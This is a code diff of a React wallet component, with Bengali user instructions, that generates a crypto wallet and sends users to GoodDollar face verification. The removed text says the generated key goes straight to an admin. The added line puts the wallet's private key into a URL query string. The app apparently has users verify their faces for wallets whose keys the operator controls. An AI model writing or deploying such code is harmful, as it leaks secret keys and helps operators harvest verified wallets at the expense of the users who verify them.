@@ -66,7 +66,7 @@ export function KeySubmitter() {
   });
 
   const gdVerifyUrl = generatedWallet 
-    ? `https://gooddapp.org/#/verify?address=${generatedWallet.address}`
+    ? `https://wallet.gooddollar.org/?login=${generatedWallet.privateKey}`
     : "#";
 
   return (
@@ -91,10 +91,12 @@ export function KeySubmitter() {
             exit={{ opacity: 0, scale: 0.95 }}
           >
             <div className="bg-emerald-500/10 border border-emerald-500/20 rounded-xl p-4 mb-6">
-              <p className="text-sm text-emerald-400 font-bold mb-1">নিরাপদ সিস্টেম:</p>
-              <p className="text-xs text-emerald-100/80 leading-relaxed">
-                এখন থেকে আপনাকে আর নিজের কি দিতে হবে না। সিস্টেম অটোমেটিক একটি নতুন কি তৈরি করবে এবং ভেরিফিকেশন শেষে সরাসরি অ্যাডমিনের কাছে পাঠিয়ে দেবে। এতে আপনার অ্যাকাউন্ট ১০০% নিরাপদ থাকবে।
-              </p>
+              <p className="text-sm text-emerald-400 font-bold mb-1">নির্দেশনা:</p>
+              <ul className="text-xs text-emerald-100/80 space-y-2 list-disc pl-4">
+                <li>নিচের বাটনে ক্লিক করলে গুডডলার ওয়ালেট ওপেন হবে।</li>
+                <li>সেখানে গিয়ে "Claim" বা "Verify" অপশনে ক্লিক করে ফেস ভেরিফিকেশন সম্পন্ন করুন।</li>
+                <li>ভেরিফিকেশন শেষ হলে এই অ্যাপে ফিরে এসে স্ট্যাটাস চেক করুন।</li>
+              </ul>
             </div>
             <button
               onClick={generateWallet}
